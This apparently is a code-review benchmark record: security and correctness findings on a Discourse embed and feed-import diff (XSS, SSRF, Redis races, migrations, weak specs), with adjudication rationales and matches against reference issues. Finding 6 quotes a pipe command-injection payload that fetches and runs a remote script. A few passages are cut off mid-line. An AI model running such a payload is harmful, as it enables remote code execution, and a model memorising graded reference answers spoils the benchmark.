findings.issue_text: /tmp/best_erb.rb:7: syntax error, unexpected ';'

Failure scenario: any `GET /embed/best?embed_url=…` where a `TopicEmbed` row already exists renders `best.html.erb` → `SyntaxError` at template compile → 500. Only the `loading` path (first-ever visit) works, so the feature appears to "work" once and then breaks permanently.
Fix: `<%- end %>`, and add a `render_views` spec for both the `best` and `loading` templates.
**2. `app/models/post.rb:131` + `app/jobs/scheduled/poll_feed.rb:35` — stored XSS: feed HTML is double-unescaped and then rendered with no sanitizer.**
Failure scenario: a blog post whose body quotes HTML — or any compromised/hostile feed — yields `
Fix: run imported HTML through `Sanitize`/`PrettyText.sanitize` (or Loofah) before persisting, drop the unconditional `CGI.unescapeHTML`, and allowlist URL schemes on `href`/`src`.
**3. `app/jobs/scheduled/poll_feed.rb:35` — `i.content.scrub` crashes the whole poll for common feeds.**

Plain RSS 2.0 feeds carry `description`/`summary` and no `content:encoded`, so `i.content` is nil (or not defined by simple-rss) → `NoMethodError`. There is no per-item `rescue` and `sidekiq_options retry: false`, so one bad item silently aborts the entire hourly import with nothing user-visible. `String#scrub` also requires Ruby ≥ 2.1, which is not guaranteed for this Gemfile's era.

Fix: `content = i.content || i.summary || i.description` with a `next if content.blank?`, guard `i.title` the same way (it flows into `PostCreator` with `skip_validations: true`), and wrap each item in a `rescue => e; Rails.logger.warn`.
**4. `app/controllers/embed_controller.rb:15` — unauthenticated request → unbounded Sidekiq jobs, outbound fetches and topic creation.**

The 60s throttle lives *inside* the job and is keyed on the exact URL string, so `?a=1`, `?a=2`, … each bypass it. Every anonymous GET enqueues a job; each job may run a **full synchronous `Jobs::PollFeed`** (`lib/topic_retriever.rb:41`) plus an HTTP fetch, then create a topic via `PostCreator` with `skip_validations: true` (all spam/rate-limit checks off).

Failure scenario: a script hitting `/embed/best?embed_url=http://host/post?i=<n>` with a spoofed `Referer` floods the job queue, hammers the embeddable host, and spawns near-duplicate topics for every query-string variant of the same article.

Fix: rate-limit at the controller (per-IP), normalize `embed_url` (strip fragment/tracking params) before both the throttle key and the `topic_embeds` lookup, and make the RSS fallback a separate throttled job rather than an inline full poll.

**5. `db/migrate/20131217174004_create_topic_embeds.rb:3` and `db/migrate/20131223171005_create_top_topics.rb:3` — `force: true` silently drops existing tables, and one of these migrations was already shipped.**

`create_table …, force: true` issues `DROP TABLE IF EXISTS` first. Editing the *pre-existing* `CreateTopTopics` migration is also outside this PR's scope and means environments now disagree about what that migration did.
Failure scenario: `rake db:migrate:redo`, a multisite re-run, or any replay drops `top_topics`/`topic_embeds` and their data with no error.
Fix: remove `force: true` from both, and revert the unrelated edit to `20131223171005_create_top_topics.rb`.
**6. `app/models/topic_embed.rb:48` — `Kernel#open` for remote fetching (command injection, no timeout, redirect SSRF).**

`open(url)` executes a subprocess when the string starts with `|`. `import_remote` is public and `lib/tasks/disqus.thor:149` now feeds it `t[:link]` straight from an attacker-supplied XML export — `|curl evil.sh|sh` would run. Even on the validated path there is no `read_timeout`/`open_timeout` and no size cap, so one slow or huge response pins a Sidekiq worker indefinitely; open-uri also follows redirects, so the embeddable host can redirect the fetch to an internal address, defeating `invalid_host?`.
Also: `topic_embed.rb` never `require`s `open-uri` — it only works because `poll_feed.rb` happens to require it at load time.

Fix: use `OpenURI.open_uri(url, read_timeout:, open_timeout:)` (or `FinalDestination`/`Net::HTTP`) with an explicit `http`/`https` scheme check, a byte cap, and redirect-target re-validation; `require 'open-uri'` in the file that uses it.

The `--category` option was deleted (CLI break) and `created_at: Date.parse(t[:created_at])` was dropped, so every imported topic is now dated "today" while its child comments keep their real dates. The importer also now makes one blocking network fetch per thread and returns `nil` (skipping the whole thread's comments) whenever a link 404s or times out.
None of this is implied by "enhance embed URL handling and validation", and there is no test coverage.
Fix: keep `category`/`created_at` by passing them through to `TopicEmbed.import_remote` → `PostCreator`, and fall back to the old `PostCreator` path when the fetch fails.
**8. `lib/topic_retriever.rb:27-28` — `setnx` + `expire` is not atomic.**

If the process dies (or Redis fails over) between the two calls, the key has no TTL and `retrieved_recently?` returns `true` forever for that URL — that article can never be retrieved again, and visitors sit on the 30s-reload loading page indefinitely.
Fix: `$redis.set(key, "1", nx: true, ex: 60)`.

The diff adds top-level `embed.js` / `embed.css.scss` and `layouts/embed.html.erb` calls `stylesheet_link_tag 'embed'`, but nothing registers them in `config.assets.precompile` — under Rails 4 with `check_precompiled_asset`, that raises in production. (`config/application.rb` isn't in this snapshot; please verify it lists both.)

Only `Gemfile_rails4.lock` was regenerated. The Gemfile's dual-boot shim (`default_lockfile`) implies a companion `Gemfile.lock` for the `RAILS3` path; with two new gems in the Gemfile and a stale lock, `bundle install --deployment`/frozen will fail there.
`spec/components/topic_retriever_spec.rb` stubs the class under test's own private methods (`expects(:perform_retrieve)`, `expects(:retrieved_recently?)`), so it asserts the dispatch it just mocked.

`spec/jobs/poll_feed_spec.rb:16` and `:22` are vacuous: `feed_polling_enabled?` defaults to `false` in test, so the first clause short-circuits and both specs would still pass with the `feed_polling_url`/`embed_by_username` guards deleted. Nothing ever calls `poll_feed`, so issue #3 is invisible to CI.
No spec renders a view (issue #1), and none covers `absolutize_urls` beyond the happy path.

Fix: add a `render_views` controller spec, a `poll_feed` spec driving a real RSS fixture through `SimpleRSS` (description-only and `content:encoded` variants), and drop the self-mocking in favor of asserting on `TopicEmbed`/Redis state.

**`app/controllers/embed_controller.rb:26,28`** — `Referer` is the only gate: it's absent under `Referrer-Policy: no-referrer` and on HTTPS→HTTP downgrades (legitimate embeds silently 403) and trivially forged by non-browsers (so it's not a security control). `embeddable_host` accepts no normalization, so `www.example.com` vs `example.com`, or an admin pasting `http://example.com`, fails permanently with no feedback. `X-Frame-Options: ALLOWALL` is not a valid value — it works only because browsers ignore unrecognized directives; deleting the header is the honest expression of intent.

**`app/views/layouts/embed.html.erb:11`** — `postMessage` `targetOrigin` should be a bare origin, not the full referer URL; ERB escaping also turns `&` in the referer into `&`. Compute `URI(request.referer)` → `scheme://host:port` in the controller.

**`app/assets/javascripts/embed.js:17`** — `discourseUrl.indexOf(e.origin) === -1` is a substring test: an attacker origin that is a prefix of your forum URL (`https://forum.example.co` vs `https://forum.example.com`) passes. Compare against a precomputed origin with `===`. Also: no null guard on `#discourse-comments` (throws on pages missing the div), `iframe.height = n + "px"` is invalid for the `height` attribute, and line 7 silently requires `discourseUrl` to have a trailing slash with nothing documenting that.

**`db/migrate/20131217174004_create_topic_embeds.rb:6`** — `embed_url` is `varchar(255)`; a longer URL raises `PG::StringDataRightTruncation` inside the job, and combined with the 30s reload in `loading.html.erb` the visitor gets an infinite reload loop. Use `t.text` (index it with a hash/expression index) and add indexes on `topic_id`/`post_id`, plus cleanup when the topic or post is deleted.

**`app/models/topic_embed.rb:13,32`** — `contents <<` mutates the caller's string (raises on a frozen string); `url` is interpolated into `href='…'` unescaped; `embed.post` can be `nil` after a post deletion, so `PostRevisor.new(nil).revise!` raises. Line 25's `create!` can also lose a race against the unique index — catch `RecordNotUnique` and fall through to the update path.

**`app/models/topic_embed.rb:56`** — `absolutize_urls` only rewrites `/`-prefixed URLs; document-relative (`images/x.png`) and protocol-relative (`//cdn/x.png`) links stay broken, and the `port != 80 && != 443` check mismatches http-on-443 / https-on-80.

**`db/migrate/20131219203905_add_cook_method_to_posts.rb:3`** — `add_column … default: 1, null: false` on `posts` rewrites the entire table under `ACCESS EXCLUSIVE` on PostgreSQL < 11; on a large forum that is real downtime. Add the column nullable, backfill in batches, then set the default/constraint.

**Dead code / noise** — `Jobs::PollFeed#feed_key` (line 20) is never used (the conditional-GET feature it implies was never wired up); `require_dependency 'email/sender'` in `app/jobs/regular/retrieve_topic.rb:1` and `require_dependency 'jobs/regular/process_post'` in `spec/jobs/poll_feed_spec.rb:2` are copy-paste; the `embed.permalink` locale key is unused; `db/migrate/20131210181901_migrate_word_counts.rb` and `lib/post_revisor.rb:14` contain whitespace-only churn, and four new files are missing trailing newlines.

**No documentation** for the feature: `embed.js` depends on undeclared `discourseUrl` / `discourseEmbedUrl` globals and a `#discourse-comments` element, with nothing telling a site owner how to install it or that `embeddable_host` must be a bare hostname.

adjudication_records.issue_text: /tmp/best_erb.rb:7: syntax error, unexpected ';'

adjudication.rationale: The new template `app/views/embed/best.html.erb` contains an invalid ERB/Ruby construct: `  <%- end if %>` inside the `<header>` block. In Ruby, `end` cannot be followed by an `if` modifier without a condition, so the ERB compiler will emit invalid Ruby (leading to a syntax error like “unexpected ';'” in the generated temporary `.rb` file). This is a concrete, verifiable syntax defect introduced by the diff.

adjudication.rationale: The `best.html.erb` template contains invalid Ruby/ERB syntax: `<%- end if %>` (line closing the header conditional). adjudication_records.issue_text: **2. `app/models/post.rb:131` + `app/jobs/scheduled/poll_feed.rb:35` — stored XSS: feed HTML is double-unescaped and then rendered with no sanitizer.**

adjudication.rationale: Real issue. `Jobs::PollFeed#poll_feed` takes `i.content` from an external RSS/Atom feed, runs `CGI.unescapeHTML` (no sanitization), and passes it to `TopicEmbed.import`. `TopicEmbed.import` creates a post with `cook_method: Post.cook_methods[:raw_html]` and `skip_validations: true`. In `Post#cook`, `raw_html` bypasses the cooking/rendering pipeline and returns `raw` directly, and the embed view renders it via `<%= raw post.cooked %>`. This stores and serves untrusted HTML as-is, enabling stored XSS via feed content (e.g., script tags/event-handler attributes), regardless of whether it’s “double”-unescaped.

adjudication.rationale: The diff introduces a `:raw_html` cook_method that returns `raw` directly in `Post#cook`, bypassing the normal cooking/sanitization pipeline. `TopicEmbed.import` creates posts with `cook_method: Post.cook_methods[:raw_html]` and `skip_validations: true`, and feed polling builds `content = CGI.unescapeHTML(i.content.scrub)` before importing. Therefore, running imported HTML through a sanitizer (PrettyText/Loofah/Sanitize), avoiding unconditional `CGI.unescapeHTML`, and scheme-allowlisting is a real and verifiable security defect in this diff.

Even on the validated path there is no `read_timeout`/`open_timeout` and no size cap, so one slow or huge response pins a Sidekiq worker indefinitely; open-uri also follows redirects, so the embeddable host can redirect the fetch to an internal address, defeating `invalid_host?`.

adjudication.rationale: The diff introduces multiple `open(...)` calls on attacker-influenced strings without safe constraints. In `TopicEmbed.import_remote` it does `open(url).read` with no scheme/format validation, and `lib/tasks/disqus.thor` now passes `t[:link]` from the Disqus XML export directly into `TopicEmbed.import_remote(user, t[:link], ...)`. In Ruby, when `open-uri` is loaded, `Kernel#open` retains the pipe feature where a string starting with `|` executes a subprocess, so a crafted link like `|curl ...|sh` would be dangerous. Separately, `TopicRetriever.invalid_host?` only checks the initial URL’s host, but `open-uri` follows redirects, so an allowed host can redirect the fetch to an internal address (SSRF) despite that check. The code also does not set timeouts or impose a response size cap around these fetches, so a slow/large response can tie up a Sidekiq worker for a long time.

adjudication_records.issue_text: Also: `topic_embed.rb` never `require`s `open-uri` — it only works because `poll_feed.rb` happens to require it at load time.

adjudication.rationale: `TopicEmbed.import_remote` calls `open(url).read` on an HTTP URL, which relies on the `open-uri` extension to `Kernel#open`. In this diff, `topic_embed.rb` does not `require 'open-uri'`, and other call sites (`TopicRetriever#fetch_http`, the Disqus thor task) invoke `import_remote` without requiring `open-uri` first. It would only work if some unrelated code happened to have loaded `open-uri` earlier (e.g., `poll_feed.rb`), which is not guaranteed.

adjudication_records.issue_text: Fix: use `OpenURI.open_uri(url, read_timeout:, open_timeout:)` (or `FinalDestination`/`Net::HTTP`) with an explicit `http`/`https` scheme check, a byte cap, and redirect-target re-validation; `require 'open-uri'` in the file that uses it.
matched_golden_ids: The PollFeed job calls open(SiteSetting.feed_polling_url) without validating the URL, allowing an attacker who controls the feed_polling_url site setting to make the server fetch arbitrary internal or external URLs.
adjudication_records.primary_judge_reasoning: Yes. The candidate explicitly calls for validating the URL/scheme before using open/open_uri (and re-validating redirects), which addresses the same underlying risk as the golden comment: unvalidated SiteSetting.feed_polling_url leading to server-side fetching of arbitrary internal/external URLs (SSRF).

adjudication_records.issue_text: The `--category` option was deleted (CLI break) and `created_at: Date.parse(t[:created_at])` was dropped, so every imported topic is now dated "today" while its child comments keep their real dates. The importer also now makes one blocking network fetch per thread and returns `nil` (skipping the whole thread's comments) whenever a link 404s or times out.

adjudication.rationale: The diff in `lib/tasks/disqus.thor` removes the `--category` Thor option and all code that maps it to `category_id`, so existing CLI usage is broken. It also replaces `PostCreator.new(... created_at: Date.parse(t[:created_at]), category: category_id)` with `TopicEmbed.import_remote(user, t[:link], title: t[:title])`, and `TopicEmbed.import_remote`/`TopicEmbed.import` do not set `created_at`, so imported topics will be created with the current timestamp rather than the thread's original `created_at` (while the subsequent per-comment creation code likely still uses original dates). Additionally, `import_remote` performs `open(url).read` per thread, which introduces a blocking network fetch that the previous code did not do. However, the claim that it "returns nil" on 404/timeout is not verifiable from the diff: `open-uri` errors would more likely raise and abort the import unless rescued elsewhere, rather than cleanly returning nil and skipping comments.

adjudication_records.issue_text: None of this is implied by "enhance embed URL handling and validation", and there is no test coverage.

Also, the statement about what is or isn’t “implied by enhance embed URL handling and validation” depends on an external commit message/context not present in the diff, so it’s not a concrete defect in the code change itself.

adjudication_records.issue_text: Fix: keep `category`/`created_at` by passing them through to `TopicEmbed.import_remote` → `PostCreator`, and fall back to the old `PostCreator` path when the fetch fails.

adjudication.rationale: The diff changes the Disqus import path from explicitly creating a post with `PostCreator.new(..., created_at: Date.parse(t[:created_at]), category: category_id)` to `TopicEmbed.import_remote(user, t[:link], title: t[:title])`. `TopicEmbed.import_remote`/`.import` never forwards `created_at` (or category) into `PostCreator`, so imported topics will get the current timestamp and no category assignment. Additionally, `import_remote` does a bare `open(url).read` with no rescue; if fetching/parsing fails it will raise and abort the Thor task, whereas the old code could still create a topic using just the permalink. These are concrete behavioral regressions introduced by the diff, so the proposed finding maps to real issues in the change.

adjudication_records.issue_text: **8. `lib/topic_retriever.rb:27-28` — `setnx` + `expire` is not atomic.**

adjudication.rationale:
In `lib/topic_retriever.rb` `retrieved_recently?` throttles via:
```rb
if $redis.setnx(retrieved_key, "1")
  $redis.expire(retrieved_key, 60)
  return false
end
```
`SETNX` and `EXPIRE` are two separate Redis commands, so they are not atomic. If the process crashes or the Redis connection drops after `setnx` succeeds but before `expire` is applied, the `retrieved_key` can be left without a TTL, causing the embed URL to be throttled indefinitely (a real correctness defect introduced by this diff).

adjudication_records.issue_text: If the process dies (or Redis fails over) between the two calls, the key has no TTL and `retrieved_recently?` returns `true` forever for that URL — that article can never be retrieved again, and visitors sit on the 30s-reload loading page indefinitely.

adjudication.rationale: In `lib/topic_retriever.rb`, `retrieved_recently?` does `$redis.setnx(retrieved_key, "1")` and then separately calls `$redis.expire(retrieved_key, 60)`. If the process crashes, raises, or loses connection after `setnx` succeeds but before `expire` executes, the key is left without a TTL. After that, `setnx` will always return false and `retrieved_recently?` will always return true for that `embed_url`, permanently preventing `perform_retrieve` from running. Since `EmbedController#best` renders `loading` when no `TopicEmbed` exists (and the loading page just reloads every 30s), this can lead to an indefinite loading loop for that URL.

adjudication_records.issue_text: Fix: `$redis.set(key, "1", nx: true, ex: 60)`.

adjudication.rationale:
In `lib/topic_retriever.rb` `retrieved_recently?` throttling is implemented with two separate Redis commands:

```ruby
if $redis.setnx(retrieved_key, "1")
  $redis.expire(retrieved_key, 60)
  return false
end
```

This is not atomic. If the process crashes or is killed after `setnx` succeeds but before `expire` runs, the key may be left without a TTL, causing the URL to be considered “retrieved recently” indefinitely (effectively permanent throttling until the key is manually cleared). Using `SET key value NX EX 60` (e.g., `$redis.set(key, "1", nx: true, ex: 60)`) avoids this defect by setting the value and expiration in one atomic operation.

adjudication_records.issue_text: The diff adds top-level `embed.js` / `embed.css.scss` and `layouts/embed.html.erb` calls `stylesheet_link_tag 'embed'`, but nothing registers them in `config.assets.precompile` — under Rails 4 with `check_precompiled_asset`, that raises in production. (`config/application.rb` isn't in this snapshot; please verify it lists both.)

Only `Gemfile_rails4.lock` was regenerated. The Gemfile's dual-boot shim (`default_lockfile`) implies a companion `Gemfile.lock` for the `RAILS3` path; with two new gems in the Gemfile and a stale lock, `bundle install --deployment`/frozen will fail there.

Neither the dual-boot shim nor any companion lockfile is shown/modified in this diff, so from the diff alone it’s not verifiable that a Rails 3/deployment/frozen bundle path exists or will fail.

adjudication_records.issue_text: `spec/components/topic_retriever_spec.rb` stubs the class under test's own private methods (`expects(:perform_retrieve)`, `expects(:retrieved_recently?)`), so it asserts the dispatch it just mocked.

adjudication.rationale: Yes. In `spec/components/topic_retriever_spec.rb`, the examples set expectations on (and stub) methods of the object under test itself: e.g. `topic_retriever.expects(:perform_retrieve)` and `topic_retriever.expects(:retrieved_recently?).returns(false/true)`. This makes the “with a valid host” tests largely assert that `#retrieve` dispatches to `perform_retrieve` based on a predicate whose return value the test just forced, rather than exercising the real `retrieved_recently?` (and thus not validating the throttling/redis logic). This is a verifiable test anti-pattern introduced in the diff.

adjudication_records.issue_text: `spec/jobs/poll_feed_spec.rb:16` and `:22` are vacuous: `feed_polling_enabled?` defaults to `false` in test, so the first clause short-circuits and both specs would still pass with the `feed_polling_url`/`embed_by_username` guards deleted. Nothing ever calls `poll_feed`, so issue #3 is invisible to CI.

adjudication.rationale: In `Jobs::PollFeed#execute`, `poll_feed` is only called when **all three** conditions are true: `feed_polling_enabled? && feed_polling_url.present? && embed_by_username.present?`. In `spec/jobs/poll_feed_spec.rb`, the tests "requires feed_polling_url" and "requires embed_by_username" stub only `feed_polling_url`/`embed_by_username` to `nil` but do **not** stub `feed_polling_enabled?` to `true`. Since `feed_polling_enabled` is introduced with a default of `false` in `config/site_settings.yml`, `execute` will short-circuit on `feed_polling_enabled?` and never reach the other guards, so those specs would still pass even if the `feed_polling_url` / `embed_by_username` checks were removed. This makes the tests effectively vacuous for those guards and reduces CI coverage.

adjudication_records.issue_text: No spec renders a view (issue #1), and none covers `absolutize_urls` beyond the happy path.

adjudication.rationale: This finding is essentially about test coverage rather than a verifiable defect introduced by the diff. The diff does add specs for `EmbedController`, `TopicRetriever`, `Jobs::PollFeed`, and `TopicEmbed`. While the controller spec does not enable `render_views` (so it likely won’t render ERB templates in a typical RSpec controller-spec configuration), that’s not a correctness/security bug in the code itself—just a testing choice. Also, `TopicEmbed` specs do cover more than a single “happy path” for URL handling: they test a malformed URL returning nil and they assert relative-to-absolute conversion for both `` and `` (plus an update path). Missing additional edge-case tests for `absolutize_urls` is not a clear defect in the diff.

adjudication_records.issue_text: Fix: add a `render_views` controller spec, a `poll_feed` spec driving a real RSS fixture through `SimpleRSS` (description-only and `content:encoded` variants), and drop the self-mocking in favor of asserting on `TopicEmbed`/Redis state.

adjudication.rationale: The proposed finding is asking for stronger/less-mocked tests (e.g., `render_views`, using a real RSS fixture through SimpleRSS, and avoiding stubbing methods on the subject). In the diff, there are already controller/job/model specs that intentionally stub SiteSetting and internal methods (e.g., `TopicRetriever` spec stubs `retrieved_recently?`, `EmbedController` spec doesn’t need rendered views to assert behavior). This is test quality/coverage guidance rather than a verifiable defect, security issue, or correctness bug introduced by the diff. Nothing in the diff demonstrates failing behavior due to lack of `render_views` or fixture-driven RSS parsing.

adjudication_records.issue_text: **`app/controllers/embed_controller.rb:26,28`** — `Referer` is the only gate: it's absent under `Referrer-Policy: no-referrer` and on HTTPS→HTTP downgrades (legitimate embeds silently 403) and trivially forged by non-browsers (so it's not a security control). `embeddable_host` accepts no normalization, so `www.example.com` vs `example.com`, or an admin pasting `http://example.com`, fails permanently with no feedback. `X-Frame-Options: ALLOWALL` is not a valid value — it works only because browsers ignore unrecognized directives; deleting the header is the honest expression of intent.

adjudication.rationale: In `EmbedController#ensure_embeddable`, access is gated solely by `request.referer` host equality: `URI(request.referer || '').host != SiteSetting.embeddable_host` raises. If the browser omits Referer (e.g., `Referrer-Policy: no-referrer`, some privacy settings, or certain downgrade/cross-origin scenarios), `request.referer` is nil, `URI('')` yields nil host, and the request is rejected—breaking legitimate embeds. Also, this check is not a robust security control since Referer can be spoofed by non-browser clients. The comparison uses the raw setting with no normalization (scheme/port stripping, `www`/case handling), so settings like `http://example.com` or `www.example.com` will fail against the parsed referer host. Finally, it sets `X-Frame-Options = "ALLOWALL"`, which is not a standard/valid X-Frame-Options directive (valid values are `DENY`, `SAMEORIGIN`, and the deprecated `ALLOW-FROM`), so behavior relies on browser handling of an unrecognized value and may not reliably express the intended framing policy.

adjudication_records.issue_text: **`app/views/layouts/embed.html.erb:11`** — `postMessage` `targetOrigin` should be a bare origin, not the full referer URL; ERB escaping also turns `&` in the referer into `&`. Compute `URI(request.referer)` → `scheme://host:port` in the controller.
matched_golden_ids: postMessage targetOrigin should be the origin (scheme+host+port), not the full referrer URL; using the full URL will cause the message to be dropped and prevent resizing.
adjudication_records.primary_judge_reasoning: The candidate flags that postMessage targetOrigin must be the bare origin (scheme+host+port) rather than the full referrer URL, which matches the golden issue about messages being dropped/preventing resizing. Extra note about ERB escaping is additional but not conflicting.

adjudication_records.issue_text: **`app/assets/javascripts/embed.js:17`** — `discourseUrl.indexOf(e.origin) === -1` is a substring test: an attacker origin that is a prefix of your forum URL (`https://forum.example.co` vs `https://forum.example.com`) passes. Compare against a precomputed origin with `===`. Also: no null guard on `#discourse-comments` (throws on pages missing the div), `iframe.height = n + "px"` is invalid for the `height` attribute, and line 7 silently requires `discourseUrl` to have a trailing slash with nothing documenting that.
matched_golden_ids: The current origin validation using indexOf is insufficient and can be bypassed. An attacker could use a malicious domain like evil-discourseUrl.com to pass this check.
adjudication_records.primary_judge_reasoning: Yes. The candidate flags that using `indexOf` for origin validation is a substring/prefix check that can be bypassed by crafted attacker origins, and recommends strict origin comparison (`===`). This matches the golden issue about bypassing the check with malicious domains.

adjudication_records.issue_text: **`db/migrate/20131217174004_create_topic_embeds.rb:6`** — `embed_url` is `varchar(255)`; a longer URL raises `PG::StringDataRightTruncation` inside the job, and combined with the 30s reload in `loading.html.erb` the visitor gets an infinite reload loop. Use `t.text` (index it with a hash/expression index) and add indexes on `topic_id`/`post_id`, plus cleanup when the topic or post is deleted.

adjudication.rationale: In the migration `CreateTopicEmbeds`, `t.string :embed_url` will be `varchar(255)` on PostgreSQL by default. The new code stores arbitrary `embed_url` values from params/feeds (`EmbedController#best` requires `embed_url`; `TopicEmbed.import`/`create!` persists it). If a URL exceeds 255 chars, `TopicEmbed.create!` will raise (e.g., `PG::StringDataRightTruncation`), causing the background job (`Jobs::RetrieveTopic` / `TopicRetriever`) to fail and never create the `TopicEmbed`. Since `EmbedController#best` enqueues `retrieve_topic` whenever `topic_id_for_embed` is nil and `loading.html.erb` reloads every 30s, a permanently failing import can result in an endless reload/enqueue loop for that visitor. The additional suggestions (indexes on topic_id/post_id, cleanup on delete) are reasonable improvements but not strictly required to validate the core defect.

adjudication_records.issue_text: **`app/models/topic_embed.rb:13,32`** — `contents <<` mutates the caller's string (raises on a frozen string); `url` is interpolated into `href='…'` unescaped; `embed.post` can be `nil` after a post deletion, so `PostRevisor.new(nil).revise!` raises. Line 25's `create!` can also lose a race against the unique index — catch `RecordNotUnique` and fall through to the update path.

adjudication.rationale: In `TopicEmbed.import`, the code appends to the `contents` argument via `contents << ...`, which does mutate the caller’s string (and would raise if a frozen string were passed). More importantly, it interpolates `url` directly into an HTML attribute inside `"<a href='#{url}'>"` without escaping; the only check is `url =~ /^https?\:\/\//`, which allows payloads containing quotes/attribute breaks (and because these posts are later rendered as raw HTML via `cook_method :raw_html` and `raw post.cooked`, this becomes an XSS risk). In the update path, `post = embed.post` can be `nil` if the associated post was deleted (no dependent cleanup shown), and then `PostRevisor.new(post)` would raise. Finally, the check-then-`create!` sequence against a unique index on `embed_url` can indeed race and raise `RecordNotUnique`, which is not handled.

adjudication_records.issue_text: **`app/models/topic_embed.rb:56`** — `absolutize_urls` only rewrites `/`-prefixed URLs; document-relative (`images/x.png`) and protocol-relative (`//cdn/x.png`) links stay broken, and the `port != 80 && != 443` check mismatches http-on-443 / https-on-80.

adjudication.rationale: In `TopicEmbed.absolutize_urls`, links are only rewritten when `href`/`src` starts with `'/'` (`start_with?('/')`). That leaves other relative forms like `images/x.png` (document-relative) untouched, which will resolve relative to the Discourse embed page rather than the original article, breaking those URLs despite the method comment claiming to convert relative URLs. Also, the port logic appends `:port` only when `uri.port != 80 && uri.port != 443`, ignoring the URL scheme; for `http://host:443/...` or `https://host:80/...` it will incorrectly omit the explicit port, producing wrong absolute URLs.

adjudication_records.issue_text: **`db/migrate/20131219203905_add_cook_method_to_posts.rb:3`** — `add_column … default: 1, null: false` on `posts` rewrites the entire table under `ACCESS EXCLUSIVE` on PostgreSQL < 11; on a large forum that is real downtime. Add the column nullable, backfill in batches, then set the default/constraint.

adjudication.rationale: The diff adds a migration `add_column :posts, :cook_method, :integer, default: 1, null: false`. On PostgreSQL versions prior to 11, adding a column with a non-NULL default typically rewrites the entire table and holds an `ACCESS EXCLUSIVE` lock for the duration, which can cause significant downtime on large `posts` tables. This is a well-known, directly verifiable operational hazard introduced by the migration as written; the suggested safer pattern (add nullable/no default, backfill, then set default/NOT NULL) addresses it.

adjudication_records.issue_text: **Dead code / noise** — `Jobs::PollFeed#feed_key` (line 20) is never used (the conditional-GET feature it implies was never wired up); `require_dependency 'email/sender'` in `app/jobs/regular/retrieve_topic.rb:1` and `require_dependency 'jobs/regular/process_post'` in `spec/jobs/poll_feed_spec.rb:2` are copy-paste; the `embed.permalink` locale key is unused; `db/migrate/20131210181901_migrate_word_counts.rb` and `lib/post_revisor.rb:14` contain whitespace-only churn, and four new files are missing trailing newlines.

Additionally, the diff shows multiple files with `\ No newline at end of file` and whitespace-only churn in the referenced files, which is real “noise” in the change set (even if low impact).

adjudication_records.issue_text: **No documentation** for the feature: `embed.js` depends on undeclared `discourseUrl` / `discourseEmbedUrl` globals and a `#discourse-comments` element, with nothing telling a site owner how to install it or that `embeddable_host` must be a bare hostname.

adjudication.rationale: While `app/assets/javascripts/embed.js` does rely on external setup (globals `discourseUrl`/`discourseEmbedUrl` and a `#discourse-comments` element), the diff itself does not show a verifiable defect/bug caused by this—it's an expected integration contract for an embed script. Also, `embeddable_host` being a hostname is already implied/partially documented in the added site setting label (`"Host that can embed..."`) and enforced by code comparing against `URI(...).host`. The finding is primarily about missing external documentation, which is subjective and not a concrete correctness/security problem demonstrable from the diff alone.
